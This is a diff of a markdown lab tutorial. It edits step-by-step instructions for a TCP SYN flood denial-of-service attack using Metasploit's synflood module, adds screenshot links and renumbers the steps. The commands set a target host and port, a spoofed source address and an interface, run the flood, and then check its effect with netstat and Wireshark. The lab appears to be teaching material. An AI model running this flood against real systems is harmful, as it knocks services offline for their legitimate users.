@@ -25,55 +25,51 @@ and preventing legitimate clients from connecting.
 ``` bash
 msfconsole
 ```
-
+![msfconsole](../images/msf-launch.png)
 ### b. Search for the SYN Flood module
 
 ``` bash
 search synflood
 ```
-
+![Synflood search](../images/synflood-search.png)
 ### c. Select the SYN Flood module and display options
 
 ``` bash
 use auxiliary/dos/tcp/synflood
 show options
 ```
-
-### d. Configure the target IP address and port
+![synflood options](../images/synflood-options.png)
+### d. Configure the target IP address, port and spoofed source IP address
 
 ``` bash
 set RHOST 192.168.43.22
 set RPORT 80
-```
-
-### e. Configure a spoofed source IP address
-
-``` bash
 set SHOST 184.56.100.250
 ```
-
-### f. Define the network interface
+![Sunflood config](../images/synflood-config.png)
+### e. Define the network interface
 
 ``` bash
 set INTERFACE eth0
 ```
 
-### g. Execute the TCP SYN Flood attack
+### f. Execute the TCP SYN Flood attack
 
 ``` bash
 run
 ```
-
-### h. Verification using netstat on the target
+![Synflood run](../images/synflood-run.png)
+### g. Verification using netstat on the target
 
 ``` bash
 netstat -ant | grep SYN_RECV
 ```
 
-### i. Traffic analysis with Wireshark
+### h. Traffic analysis with Wireshark
 
 Wireshark shows a large number of TCP SYN packets sent to the target
 without corresponding ACK packets.
+![Wireshark analysis](../images/synflood-wireshark.png)
 
 ## 4. Impact of the Attack
 
